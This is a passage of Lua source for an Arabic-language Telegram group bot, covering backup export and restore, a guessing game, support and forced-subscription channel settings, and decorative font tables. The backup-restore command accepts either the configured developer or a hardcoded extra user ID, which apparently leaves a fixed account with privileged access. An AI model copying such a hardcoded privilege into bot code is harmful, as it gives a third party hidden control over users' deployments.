t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
t = t..'"linkgroup":"'..link..'"}'
end
t = t..'}}'
local File = io.open('./'..bot_id..'.json', "w")
File:write(t)
File:close()
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './'..DevProx..'.json', '☬︙عدد كروبٱت ٱڵبوت : ('..#list..')',dl_cb, nil)
end
if text == 'رفع النسخه' and tonumber(msg.sender_user_id_) == tonumber(DevId) or text == 'رفع النسخه' and tonumber(msg.sender_user_id_) == tonumber(218385683) then   
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
if result.content_.document_ then 
local ID_FILE = result.content_.document_.document_.persistent_id_ 
local File_Name = result.content_.document_.file_name_
add_file(msg,msg.chat_id_,ID_FILE,File_Name)
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
--     Source DevProx     --
if text and text:match("منو ضافني") then
if not DevAbs:get(DevProx..'Added:Me'..msg.chat_id_) then
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da and da.status_.ID == "ChatMemberStatusCreator" then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙*ٱنت منشئ ٱڵمجـمۄعة* ', 1, 'md') 
return false
end
local Added_Me = DevAbs:get(DevProx.."Who:Added:Me"..msg.chat_id_..':'..msg.sender_user_id_)
if Added_Me then 
tdcli_function ({ID = "GetUser",user_id_ = Added_Me},function(extra,result,success)
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
Text = '☬︙*ٱڵشخص ٱڵذي قٱم بٱضافتك هو* ↫ '..Name
Dev_Abs(msg.chat_id_, msg.id_, 1,Text, 1, 'md') 
end,nil)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙*ٱنت دخڵت عبر ٱڵرٱبط*', 1, 'md') 
end
end,nil)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙*ٱمر منو ضٱفني تم تعطيڵه من قبل ٱڵمدرٱء*', 1, 'md') 
end
end
--     Source DevProx     --
if DevAbs:get(DevProx.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 6 then
Dev_Abs( msg.chat_id_, msg.id_, 1,"☬︙*يوجد فقط ( 6 ) ٱختيٱرٱت*\n☬︙*ٱرسـل ٱختيٱرك مـره ٱخرى*\n", 1, "md")    
return false  end 
local GETNUM = DevAbs:get(DevProx.."GAMES"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
DevAbs:del(DevProx.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
Dev_Abs( msg.chat_id_, msg.id_, 1,'☬︙*ٱڵـمحيبس بـٱڵـيد رقـم* : { '..NUM..' } \n☬︙*مبروك ڵقد ربحت وحصلت على ( 5 ) نقٱط يمكنك ٱستبدٱڵها بٱڵرسٱئڵ *', 1, "md") 
DevAbs:incrby(DevProx..'bot:add:num'..msg.chat_id_..msg.sender_user_id_,5)  
elseif tonumber(NUM) ~= tonumber(GETNUM) then
DevAbs:del(DevProx.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
Dev_Abs( msg.chat_id_, msg.id_, 1,'☬︙*ٱڵـمحيبس بـٱڵـيد رقـم* : { '..GETNUM..' } \n☬︙*ڵلٱسف ڵقد خسرت حٱوڵ مره ٱخرى ڵڵعثور على ٱڵمحيبس *', 1, "md")
end
end
end
if DevAbs:get(DevProx.."bot:support:link" .. msg.sender_user_id_) then
if msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)") then
local glink = msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)")
local abs = "bot:supports:link"
DevAbs:set(DevProx..abs, glink)
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙تـۖم حفـۨظ رآبـط كروب ٱڵډعم ٱڵجډيډ ", 1, "md")
DevAbs:del(DevProx.."bot:support:link" .. msg.sender_user_id_)
elseif msg.content_.text_:match("^@(.*)[Bb][Oo][Tt]$") or msg.content_.text_:match("^@(.*)_[Bb][Oo][Tt]$") then
local bID = msg.content_.text_:match("@(.*)")
local abs = "bot:supports:link"
DevAbs:set(DevProx..abs, bID)
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙تـۖم حفـۨظ معرف ٱڵډعم ٱڵجډيډ ", 1, "md")
DevAbs:del(DevProx.."bot:support:link" .. msg.sender_user_id_)
end
end
if DevAbs:get(DevProx..'DevAbs4'..msg.sender_user_id_) then
DevAbs:del(DevProx..'DevAbs4'..msg.sender_user_id_)
local url , res = https.request('https://api.telegram.org/bot'..tokenbot..'/getChatAdministrators?chat_id='..msg.content_.text_..'')
local data = json:decode(url)
if res == 400 then
if data.description == "Bad Request: supergroup members are unavailable" then 
Dev_Abs(msg.chat_id_,msg.id_, 1, "☬︙*ڵم ترفعني ٱدمن في قنٱتك ٱرفعني ٱولٱ*", 1 , "md")
return false 
elseif data.description == "Bad Request: chat not found" then 
Dev_Abs(msg.chat_id_,msg.id_, 1, "☬︙*هذٱ ٱڵمعرف غير صحيح*", 1 , "md")
return false
end end 
if not msg.content_.text_ then
Dev_Abs(msg.chat_id_,msg.id_, 1, "☬︙*هذٱ ٱڵمعرف غير صحيح*", 1 , "md")
return false
end
local CH_BOT = msg.content_.text_:match("(.*)")
DevAbs:set(DevProx..'DevAbs3',CH_BOT)
Dev_Abs(msg.chat_id_,msg.id_, 1, "☬︙تـۖم حفظ قنٱة ٱلٱشترٱك \n☬︙ٱلٱن قم برفع ٱڵـبوت ٱدمن في ٱڵقنٱة \n☬︙بعدهٱ قم بتفعيل الاشتراك الاجباري ", 1 , "html")
return false
end
if DevAbs:get(DevProx.."zr:wordd" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
local zakrf = text:match("(.*)")  
DevAbs:del(DevProx.."zr:wordd" .. msg.chat_id_ .. "" .. msg.sender_user_id_)     
if not text:find('[ASDFGHJKLQWERTYUIOPZXCVBNMasdfghjklqwertyuiopzxcvbnm]') then 
ABS_PROX = zakrf 
local font_base = "ض,ص,ق,ف,غ,ع,ه,خ,ح,ج,ش,س,ی,ب,ل,ا,ن,ت,م,چ,ظ,ط,ز,ر,د,پ,و,ک,گ,ث,ژ,ذ,آ,ئ,.,_"  
local font_abs = "ض,ص,ق,ف,غ,ع,ه,خ,ح,ج,ش,س,ی,ب,ل,ا,ن,ت,م,چ,ظ,ط,ز,ر,د,پ,و,ک,گ,ث,ژ,ذ,آ,ئ,.,_"  
local fonts = {      "ضـٍہًہ,صًـٍـًہ,ـᓆـ,ف͒ہٰٰ,غہٰٰ,؏ۤـہٰٰ,ھہ,ـפֿـ,ـפـ,ج,ش,ـωـ,ی,بہٰٰ,لྀ̲ہٰٰ,آ,نہٰٰ,ྀ̲تہٰٰ,םـۂ,چ,ظٍـً,طہـۛ,ز,ر,ـב,پ,ـפּـ,ڪٰྀہٰٰٖـ,گـ,ثِْْہٰٰہٰٰہٰٰـ,ژ,ذَِِِْ,آ,ئ,.,_",      
"ضۜۜہٰٰ,صۛہُُِِٰٰۛہٰٰۛہٰٰ,قྀ̲ہٍٍٰٰٰٰٰྀ̲ہٰٰٰྀ̲ہٰٰٰ,ف͒ہِِٰٰٰٰ͒ہٰٰ͒ہٰٰ,غہِِِِٰٰٰٰہٰٰہٰٰ,؏ۤـہ,ٰ̲ھہ,خٰ̐ہّّٰٰٰ̐ہٰ̐ہ,حہٌٌٰٰٰٰہٰٰہٰٰ,جًًِِّّْْْۧۧۧ,شِٰہََُُِٰٰٰہِٰٰٰہٰٰ,سٌٌٍٍٰٰٰٰٰٰٓٓٓ,ی,بّہٌٌِِّٰٰہّہ,لْْٰٰ,آ,نَِٰہٍٍَِٰٰٰہَِٰہ,تَہََّّٰٰٰہََٰہَٰ,مٰ̲ہٍٍٰٰٰ̲ہٰ̲ہ,چ,ظۗہََِِْْٰٰۗہٰٰۗہٰٰ,طۨہََُُِِٰٰۨہٰٰۨہٰٰ,زًًَََََ,رِِٰٰ,دِِٰٰ,پ,وٍٍِِِّّ,ڪٰྀہٰٰٖ,گ,ثہِِْْْْٰٰہٰٰہٰٰ,ژ,ذََِِِْْ,ئ,آ,.,_",      
"ضــ,صــ,قــ,فــ,غــ,عــ,ـهــ,خــ,حــ,جــ,شــ, سـ,یــ,بــ,لــ,ﺂ,نــ,تــ,مــ,چــ,ظــ,طــ,ـز,ـر,ـد,پــ,ـو,کــ,گــ,ـثــ,ـژ,ـذ,ﺂ,ئ,.,_",        
"ضۜہٰٰ,صۛہٰٰ,قྀ̲ہٰٰٰ,ف͒ہٰٰ,غہٰٰ,؏ۤـہ,ٰ̲ھہ,خٰ̐ہ,حہٰٰ,جْۧ,شِٰہٰٰ,سٰٰٓ,ی,بّہ,ل,آ,نَِٰہ,تَہَٰ,مٰ̲ہ,چ,ظۗہٰٰ,طۨہٰٰ,زَ,ر,د,پ,وِ,ک,گ,ثہٰٰ,ژ,ذِ,ئ,آ,.,_",      
"ضًً,صــَ,ق,ف,غً,عـًً,هہـ,خِہ,ـحّ,جــٌ,ڜ,سُُُُُ,ی,بــِ,لـ,أ,نــہٰ⇣ـ,ِِتً,مہـً,چ,ظـَ,ط,ز,ر,د,پ,وُ,ﮏ,گ,ثـ͜͡ہــِ,ژ,ذ,ئ,أ  ,.,_",      
"ضًـٍـًہًـٍـًہ,صًـٍـًہ,ق,ف,غً,عً,هہـ,خِہ,ב,,جـﮩ๋͜ﮧـ͜ާْ,ڜـ͜ާ,سـّــً,ی,بہ,لـﮩﮨہٰٰہٰ,أ,טּ,تہٍِۣـّ̐ہٰ,مہ,چ,ظٍـًہ,ط,ز,ر,د,پ,وُ,ڪـ,گ,ثہـٰ̲ہٰٰ,ژ,ذ,ئ,أ  ,.,_",      
"ض,ص,ق,ف,غـ͜ﮩ͞ـ,عـ͜ﮩ͞ـ,هہـۛ,خہـۛ,ﺣہـۛ,جہـۛ,شۖہـۛ,سۜہـۛ,ی,بـ,ل,اآ,نہـۛ,تـ͜ﮩ͞ـ,مہـۛ,چ,ظـ͜ـ,طہـۛ,ز,ر,د,پ,ؤ,كـ͜ﮩ,گ,ثۨہـۛ,ژ,ذ,ئ,اآ  ,.,_",      
"ضـ͜,صـ,ق,فـ͜ـ,غہۛـۛ,عۛـۛ,ه๋͜‏ـ,خ,ح,ج,شـ͜ﮩ͞ـ,سـ͜ﮩ͞ـ,ی,ﯧـۛ,لـۛ,اآ,نـ͜ـ,ت,م͜͞ـ,چ,ظـۛ,ط๋͜‏ـ,ز,ر,د,پ,وُ,كـهـۛ,گ,ث,ژ,ذ,ئ,اآ  ,.,_",      
"ض๋͜‏ـۣۛ,صـ๋͜‏ـۣۛ,قـ,فـ๋͜‏ـۣۛ,غـ๋͜‏ـۣۛـ,عـ๋͜‏ـ,ه,خـ๋͜‏ـۣ,حـ๋͜‏ـ,,جـ๋͜‏ـ,شـ๋͜‏ـ,سـ๋͜‏ـ,ی,بہ,ل,أ,ن,تـ๋͜‏ـ,م,چ,ظـ๋͜‏ـ,ط,ز,ر,د,پ,و,كـ๋͜‏ـ,گ,ثہ,ژ,ذ,ئ,أ  ,.,_",      
"ض,ص,ق,ف,غ,ع,هـ͜ﮩ͞ـ,خ,ح,ج,ش,س,ی,ب,لـّﮩ๋͜‏ـ,آ,نہٰٰ,ྀ̲تہٰٰ,مـّﮩ๋͜‏ـ,چ,طـྀ̲͜ہٰٰ,طـ͜ﮩ͞ـ,ڒ,ـﺭْ,دۛ,پ,ﯢ,ڪ,گ,ثྀ̲ہٰٰ,ژ,ﺫ,ئ,آ  ,.,_",      
"ض,صۛہٰٰ,قྀ̲ہٰٰ,ف͒ہٰٰ,غہٰٰ,؏ۤـہٰٰ,ھہ,خٰ̐ہ,حہٰٰ,جْہ,شِٰہٰٰ,سٰٓہ,ی,بہٰٰ,لྀ̲ہٰٰ,آ,نہٰٰ,ྀ̲تہٰٰ,םـۂ,چ,ظہٰٰྀ̲,طہٰٰ,ڒ,ـﺭْ,دۛ,پ,ﯢ,ڪ,گ,ثྀ̲ہٰٰ,ژ,ﺫ,ئ,آ  ,.,_",      
"ض,صـﮩ๋͜‏ـ,قـﮩ๋͜‏ـ,فـﮩ๋͜‏ـ,غـﮩ๋͜‏ـ,؏ـﮩ๋͜‏ـ,هـﮩ๋͜‏ـ,خـﮩ๋͜‏ـ,حـﮩ๋͜‏ـ,جـﮩ๋͜‏ـ,شـﮩ๋͜‏ـ,سـﮩ๋͜‏ـ,ی,بـﮩ๋͜‏ـ,لّۣۗ,آِ,نْۛ,تٌۙ,ﻡِۙـ,چ,ظـﮩ๋͜‏ـۖۜ,طٌۗ,ﺯۖ,ږۙ,ڊْ,پ,ﯠۚ,ڪٌۘ,گ,ثٌّۜ,ژ,ﺫۗ,ئ,آِ  ,.,_",      
"ض,صـ᷈͟ـ,قـ᷈͟ـ,فـ᷈͟ـ,غـ᷈͟ـ,عـ᷈͟ـ,هـ᷈͟ـ,خـ᷈͟ـ,حـ᷈͟ـ,جـ᷈͟ـ,شـ᷈͟ـ,سـ᷈͟ـ,ی,بـ᷈͟ـ,لـ᷈͟ـ,ٲآٲ,نـ᷈͟ـ,تـ᷈͟ـ,مـ᷈͟ـ,چ,ظـ᷈͟ــ᷈͟ـ,طـ᷈͟ـ,ز,ر,د,پ,ﯠ,كـ᷈͟ـ,گ,ثـ᷈͟ـ,ژ,ذ,ئ,ٲآٲ  ,.,_",      
"ض,صـﮩ⃑ﮩ,قـﮩ⃑ﮩ,فـﮩ⃑ﮩ,غـﮩ⃑ﮩ,عـﮩ⃑ﮩ,هـﮩ⃑ﮩ,خـﮩ⃑ﮩ,حـﮩ⃑ﮩ,جـﮩ⃑ﮩ,شـﮩ⃑ﮩ,سـﮩ⃑ﮩ,ی,بـﮩ⃑ﮩ,لـﮩ⃑ﮩ,آ,نـﮩ⃑ﮩ,تـﮩ⃑ﮩ,مـﮩ⃑ﮩ,چ,ظـﮩ⃑ﮩـﮩ⃑ﮩ,طـﮩ⃑ﮩ,ڒ,ر,ډ,پ,ﯛ,كـﮩ⃑ﮩ,گ,ثـﮩ⃑ﮩ,ژ,ﮈ,ئ,آ  ,.,_",      
"ضًـٍـًہ,صًـ,ـقـ,ف,غً,عًـ,هہ,خِہ,حـ,جْـ,ڜـ,ڛً,ی,بہ,ل,آ,ہن,تہ,م,چ,ظٍـً,طٍـًہ,ز,ڑ,دٍ,پ,وُ,ـڪـ,گ,ثـ,ژ,ذٍ,ئ,آ  ,.,_",      
"ضہۣۗ,صہۣۗ,قَہۣۗـ,فُہۣۗ,غّہۣۗ,عَہۣۗ,هہۣۗ,خٌہۣۗ,حًہۣۗ,جَہۣۗ,شّہۣۗ,سہۣۗـ,ی,بّہۣۗـ,لًً,أ,نٌہۣۗـ,تُہۣۗ,مہۣۗ,چ,ظٌہۣۗ,طٌہۣۗـ,زُ,رُ,دُ,پ,وِ,كہۣۗ,گ,ثًہۣۗ,ژ,ذٌ,ئ,أ  ,.,_",      
"ض,صۭۣۣۖـ,قۭۣۣۖـ,فۭۣۣۖـ,غۭۣۣۖـ,غۭۣۣۖـ,هۭۣۣۖـ,خۭۣۣۖـ,حۭۣۣۖـ,جۭۣۣۖـ,شۭۣۣۖـ,سۭۣۣۖـ,ی,بۭۣۣۖـ,لۭۣۣۖـ,آ,نۭۣۣۖـ,تۭۣۣۖـ,مۭۣۣۖـ,چ,ظۭۣۣۖـۭۣۣۖـ,طۭۣۣۖـ,ز,ر,د,پ,ﯠ,كۭۣۣۖـ,گ,ثۭۣۣۖـ,ژ,ذ,ئ,آ  ,.,_",      
"ض,صـﮩـ,قـﮩـ,فـﮩـ,غـﮩـ,عـﮩـ,هـﮩـ,خـﮩـ,حـﮩـ,جـﮩـ,شـﮩـ,سـﮩـ,ی,بـﮩـ,لـﮩـ,ٲ,نـﮩـ,تـﮩـ,مـﮩـ,چ,ظـﮩــﮩـ,طـﮩـ,ز,ر,د,پ,و,ګ,گ,ثـﮩـ,ژ,ذ,ئ,ٲ,.,_",      
"ض,صـٰٰـۛۛۛ,قـٰٰـۛۛۛ,فـٰٰـۛۛۛ,غـٰٰـۛۛۛ,عـٰٰـۛۛۛ,هـٰٰـۛۛۛ,خـٰٰـۛۛۛ,حـٰٰـۛۛۛ,جـٰٰـۛۛۛ,شـٰٰـۛۛۛ,سـٰٰـۛۛۛ,ی,بـٰٰـۛۛۛ,لـٰٰـۛۛۛ,أ,نـٰٰـۛۛۛ,تـٰٰـۛۛۛ,مـٰٰـۛۛۛ,چ,ظـٰٰـۛۛۛـٰٰـۛۛۛ,طـٰٰـۛۛۛ,ز,ر,د,پ,و,ک,گ,ثـٰٰـۛۛۛ,ژ,ذ,ئ,أ  ,.,_",      
"ض,صـٰ۫ﹻ,قـٰ۫ﹻ,فـٰ۫ﹻ,غـٰ۫ﹻ,عـٰ۫ﹻ,هـٰ۫ﹻ,خـٰ۫ﹻ,حـٰ۫ﹻ,جـٰ۫ﹻ,شـٰ۫ﹻ,سـٰ۫ﹻ,ی,بـٰ۫ﹻ,لـٰ۫ﹻ,ٱ,نَـٰ۫ﹻ,تْـٰ۫ﹻ,مٌـٰ۫ﹻ,چ,ظٌـٰ۫ﹻـٰ۫ﹻ,طِـٰ۫ﹻ,زُ,رَ,دِ,پ,وَ,كِـٰ۫ﹻ,گ,ثُـٰ۫ﹻ,ژ,ذَ,ئ,ٱℓ  ,.,_",      
"ض,صہٰـ͢͡,قہٰـ͢͡,فہٰـ͢͡,غہٰـ͢͡,عہٰـ͢͡,هہٰـ͢͡,خہٰـ͢͡,حہٰـ͢͡,جہٰـ͢͡,شہٰـ͢͡,سہٰـ͢͡,ی,بہٰـ͢͡,لہٰـ͢͡,ا,نہٰـ͢͡,تہٰـ͢͡,مہٰـ͢͡,چ,ظہٰـ͢͡ہٰـ͢͡,طہٰـ͢͡,ز,ر,د,پ,و,كہٰـ͢͡,گ,ثہٰـ͢͡,ژ,ذ,ئ,ا  ,.,_",       }  
local result = {}   
i=0  
for k=1,#fonts do   
i=i+1   
local tar_font = fonts[i]:split(",")   
local text = ABS_PROX   
local text = text:gsub("ض",tar_font[1])     
local text = text:gsub("ص",tar_font[2])     
local text = text:gsub("ق",tar_font[3])     
local text = text:gsub("ف",tar_font[4])     
local text = text:gsub("غ",tar_font[5])     
local text = text:gsub("ع",tar_font[6])     
local text = text:gsub("ه",tar_font[7])     
local text = text:gsub("خ",tar_font[8])     
local text = text:gsub("ح",tar_font[9])     
local text = text:gsub("ج",tar_font[10])     
local text = text:gsub("ش",tar_font[11])     
local text = text:gsub("س",tar_font[12])     
local text = text:gsub("ی",tar_font[13])     
local text = text:gsub("ب",tar_font[14])     
local text = text:gsub("ل",tar_font[15])     
local text = text:gsub("ا",tar_font[16])     
local text = text:gsub("ن",tar_font[17])     
local text = text:gsub("ت",tar_font[18])     
local text = text:gsub("م",tar_font[19])     
local text = text:gsub("چ",tar_font[20])     
local text = text:gsub("ظ",tar_font[21])     
local text = text:gsub("ط",tar_font[22])     
local text = text:gsub("ز",tar_font[23])     
local text = text:gsub("ر",tar_font[24])     
local text = text:gsub("د",tar_font[25])    
local text = text:gsub("پ",tar_font[26])     
local text = text:gsub("و",tar_font[27])     
local text = text:gsub("ک",tar_font[28])     
local text = text:gsub("گ",tar_font[29])     
local text = text:gsub("ث",tar_font[30])     
local text = text:gsub("ژ",tar_font[31])     
local text = text:gsub("ذ",tar_font[32])     
local text = text:gsub("ئ",tar_font[33])     
local text = text:gsub("آ",tar_font[34])      
table.insert(result, text)   
end   
local DevAbs22 = "☬︙ٱڵكڵمة { "..ABS_PROX.." }\n☬︙تـۖمت زخرفتهٱ ٱڵى ( "..tostring(#fonts).." ) نوع \n☬︙ٱضـغط عڵى ٱڵـكڵمة ڵـنسخهٱ\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
number=0   
for v=1,#result do  
number=number+1   
local ABS_PROX = {' ۞ ',' ☊ ',' ❥˓ ',' ﴿ֆ ',' ✟ ',' ߷ ',' 彡 ',' 𒀭꙰ ',' ⧫ ',' ✠ ',' 〄 ',' あ ', ' ঌ ',' 𖤍 ',' 𖣴 ',' ➺ ',' ᤑ ',' ✹ ',' ⚚ ', ' 𓃠 ',' ⇣ ',' 𖢑 ',' ₎ۦ˛ ',' ♩ ',' ༗.',' ⇣✦ ',' ⇡ ',' 𖢃 ',' 𖢄 ',' 𖢅 ',' 𖢝 ',' 𖢜 ',' 𖢒 ',' 𖢌 ' }   
DevAbs22 = DevAbs22..''..number.."  `"..result[number]..''..ABS_PROX[math.random(#ABS_PROX)].."`\n\n"    
end  
Dev_Abs(msg.chat_id_, 0, 1, DevAbs22, 1, 'md') 
end 
end 
if DevAbs:get(DevProx.."zr:word" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then       
local zakrf = text:match("(.*)")       
DevAbs:del(DevProx.."zr:word" .. msg.chat_id_ .. "" .. msg.sender_user_id_)         
if not text:find("[\216-\219][\128-\191]") then      
ABS_PROX = zakrf     
local font_base = "A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,0,9,8,7,6,5,4,3,2,1,.,_"     
local font_abs = "z,y,x,w,v,u,t,s,r,q,p,o,n,m,l,k,j,i,h,g,f,e,d,c,b,a,Z,Y,X,W,V,U,T,S,R,Q,P,O,N,M,L,K,J,I,H,G,F,E,D,C,B,A,0,1,2,3,4,5,6,7,8,9,.,_"     
local fonts = {            "Ꭿ,Ᏸ,Ꮸ,Ꭰ,Ꭼ,Ꮀ,Ꮆ,Ꮋ,Ꭵ,Ꭻ,Ꮶ,Ꮮ,Ꮇ,Ꮑ,Ꮻ,Ꮲ,Ꮕ,Ꭱ,Ꮪ,Ꮏ,Ꮜ,Ꮙ,Ꮤ,Ꮉ,Ꮍ,Ꮓ,Ꭿ,Ᏸ,Ꮸ,Ꭰ,Ꭼ,Ꮀ,Ꮆ,Ꮋ,Ꭵ,Ꭻ,Ꮶ,Ꮮ,Ꮇ,Ꮑ,Ꮻ,Ꮲ,Ꮕ,Ꭱ,Ꮪ,Ꮏ,Ꮜ,Ꮙ,Ꮤ,Ꮉ,Ꮍ,Ꮓ,0,9,8,7,6,5,4,3,2,1  ,.,_",     
"Ǻ,฿,₡,Đ,Є,ƒ,Ģ,Ħ,Ĩ,j,k,ℓ,₥,ŋ,Ǿ,ṕ,գ,Г,Ŝ,Ṫ,ษ,Ṽ,ฟ,Ẍ,ץ,Ẕ,Ǻ,฿,₡,Đ,Є,ƒ,Ģ,Ħ,Ĩ,j,k,ℓ,₥,ŋ,Ǿ,ṕ,գ,Г,Ŝ,Ṫ,ษ,Ṽ,ฟ,Ẍ,ץ,Ẕ,0,9,8,7,6,5,4,3,2,1  ,.,_",     
"Ꭺ,b,Ꮯ,Ꭰ,Ꭼ,f,Ꮆ,h,Ꭵ,j,Ꮶ,Ꮮ,m,Ꮑ,Ꮎ,Ꮲ,q,Ꮢ,s,Ꮖ,u,Ꮙ,Ꮃ,x,Ꮍ,Ꮓ,Ꭺ,b,Ꮯ,Ꭰ,Ꭼ,f,Ꮆ,h,Ꭵ,j,Ꮶ,Ꮮ,m,Ꮑ,Ꮎ,Ꮲ,q,Ꮢ,s,Ꮖ,u,Ꮙ,Ꮃ,x,Ꮍ,Ꮓ,0,9,8,7,6,5,4,3,2,1,.,_",     
"п̵̐,в̷̐,ċ̷̐,d̷̐,є̷̐,г̵̵,j̵̐,н̷̐,ɪ̇̐,j̵̐,к̷̐,ℓ̷̐,м̷̐,л̷̐,σ̷̐,ρ̷̐,q̷̐,я̷̐,ѕ̷̐,τ̷̐,υ̷̐,ν̷̐,ω̷̐,x̷̐,у̷̐,z̷̐,п̵̐,в̷̐,ċ̷̐,d̷̐,є̷̐,г̵̵,j̵̐,н̷̐,ɪ̇̐,j̵̐к̷̐,ℓ̷̐,м̷̐,л̷̐,σ̷̐,ρ̷̐,q̷̐,я̷̐,ѕ̷̐,τ̷̐,υ̷̐,ν̷̐,ω̷̐,x̷̐,у̷̐,z̷̐,0,9,8,7,6,5,4,3,2,1,.,_",     
"ᴬ,ᴮ,ᶜ,ᴰ,ᴱ,ᶠ,ᴳ,ᴴ,ᴵ,ᴶ,ᴷ,ᴸ,ᴹ,ᴺ,ᴼ,ᴾ,ᵟ,ᴿ,ˢ,ᵀ,ᵁ,ᵛ,ᵂ,ˣ,ᵞ,ᶻ,ᴬ,ᴮ,ᶜ,ᴰ,ᴱ,ᶠ,ᴳ,ᴴ,ᴵ,ᴶ,ᴷ,ᴸ,ᴹ,ᴺ,ᴼ,ᴾ,ᵟ,ᴿ,ˢ,ᵀ,ᵁ,ᵛ,ᵂ,ˣ,ᵞ,ᶻ,0,9,8,7,6,5,4,3,2,1,.,_",     
"Ꮧ,Ᏸ,ፈ,Ꮄ,Ꮛ,Ꭶ,Ꮆ,Ꮒ,Ꭵ,Ꮰ,Ꮶ,Ꮭ,Ꮇ,Ꮑ,Ꭷ,Ꭾ,Ꭴ,Ꮢ,Ꮥ,Ꮦ,Ꮼ,Ꮙ,Ꮗ,ጀ,Ꭹ,ፚ,Ꮧ,Ᏸ,ፈ,Ꮄ,Ꮛ,Ꭶ,Ꮆ,Ꮒ,Ꭵ,Ꮰ,Ꮶ,Ꮭ,Ꮇ,Ꮑ,Ꭷ,Ꭾ,Ꭴ,Ꮢ,Ꮥ,Ꮦ,Ꮼ,Ꮙ,Ꮗ,ጀ,Ꭹ,ፚ,0,9,8,7,6,5,4,3,2,1,.,_",     
"卂۪۪,乃۪۪,匚۪۪,ᗪ۪۪,乇۪۪,千۪۪,Ꮆ۪۪,卄۪۪,丨۪۪,ﾌ۪۪,Ҝ۪۪,ㄥ۪۪,爪۪۪,几۪۪,ㄖ۪۪,卩۪۪,Ɋ۪۪,尺۪۪,丂۪۪,ㄒ۪۪,ㄩ۪۪,ᐯ۪۪,山۪۪,乂۪۪,ㄚ۪۪,乙۪۪,卂۪۪,乃۪۪,匚۪۪,ᗪ۪۪,乇۪۪,千۪۪,Ꮆ۪۪,卄۪۪,丨۪۪,ﾌ۪۪,Ҝ۪۪,ㄥ۪۪,爪۪۪,几۪۪,ㄖ۪۪,卩۪۪,Ɋ۪۪,尺۪۪,丂۪۪,ㄒ۪۪,ㄩ۪۪,ᐯ۪۪,山۪۪,乂۪۪,ㄚ۪۪,乙,0,9,8,7,6,5,4,3,2,1,.,_",     
"ؔ͜α,ؔ͜в,ؔ͜c,ؔ͜d,ؔ͜є,ؔ͜f,ؔ͜g,ؔ͜h,ؔ͜í,ؔ͜j,ؔ͜k,ؔ͜l,ؔ͜m,ؔ͜n,ؔ͜o,ؔ͜p,ؔ͜q,ؔ͜r,ؔ͜s,ؔ͜t,ؔ͜u,ؔ͜v,ؔ͜w,ؔ͜x,ؔ͜y,ؔ͜z,ؔ͜α,ؔ͜в,ؔ͜c,ؔ͜d,ؔ͜є,ؔ͜f,ؔ͜g,ؔ͜h,ؔ͜í,ؔ͜j,ؔ͜k,ؔ͜l,ؔ͜m,ؔ͜n,ؔ͜o,ؔ͜p,ؔ͜q,ؔ͜r,ؔ͜s,ؔ͜t,ؔ͜u,ؔ͜v,ؔ͜w,ؔ͜x,ؔ͜y,ؔ͜z,0,9,8,7,6,5,4,3,2,1,.,_",     
"Ꭺ,b,Ꮯ,Ꭰ,Ꭼ,f,Ꮆ,h,Ꭵ,j,Ꮶ, Ꮮ,m,Ꮑ,Ꮎ,Ꮲ,q,Ꮢ,s,Ꮖ, u,Ꮙ,Ꮃ,x,Ꮍ,Ꮓ,Ꭺ,b,Ꮯ,Ꭰ,Ꭼ,f,Ꮆ,h,Ꭵ,j,Ꮶ, Ꮮ,m,Ꮑ,Ꮎ,Ꮲ,q,Ꮢ,s,Ꮖ, u,Ꮙ,Ꮃ,x,Ꮍ,Ꮓ,0,Գ,Ց,Դ,6,5,Վ,Յ,Զ,1,.,_",     
"a̷,b̷,c̷,d̷,e̷,f̷,g̷,h̷,i̷,j̷,k,l̷,m̷,n̷,o̷,p̷,q̷,r̷,s̷,t̷,u̷,v̷,w̷,x̷,y̷,z̷,a̷,b̷,c̷,d̷,e̷,f̷,g̷,h̷,i̷,j̷,k̷,l̷,m̷,n̷,o̷,p̷,q̷,r̷,s̷,t̷,u̷,v̷,w̷,x̷,y̷,z̷,0,9,8,7,6,5,4,3,2,1,.,_",     
"A̲,̲B̲,̲C̲,̲D̲,̲E̲,̲F̲,̲G̲,̲H̲,̲I̲,̲J̲,̲K̲,̲L̲,̲M̲,̲N̲,̲O̲,̲P̲,̲Q̲,̲R̲,̲S̲,̲T̲,̲U̲,̲V̲,̲W̲,̲X̲,̲Y̲,̲Z̲,̲a̲,̲b̲,̲c̲,̲d̲,̲e̲,̲f̲,̲g̲,̲h̲,̲i̲,̲j̲,̲k̲,̲l̲,̲m̲,̲n̲,̲o̲,̲p̲,̲q̲,̲r̲,̲s̲,̲t̲,̲u̲,̲v̲,̲w̲,̲x̲,̲y̲,̲z̲,̲0̲,̲9̲,̲8̲,̲7̲,̲6̲,̲5̲,̲4̲,̲3̲,̲2̲,̲1̲,̲.̲,̲_̲",     
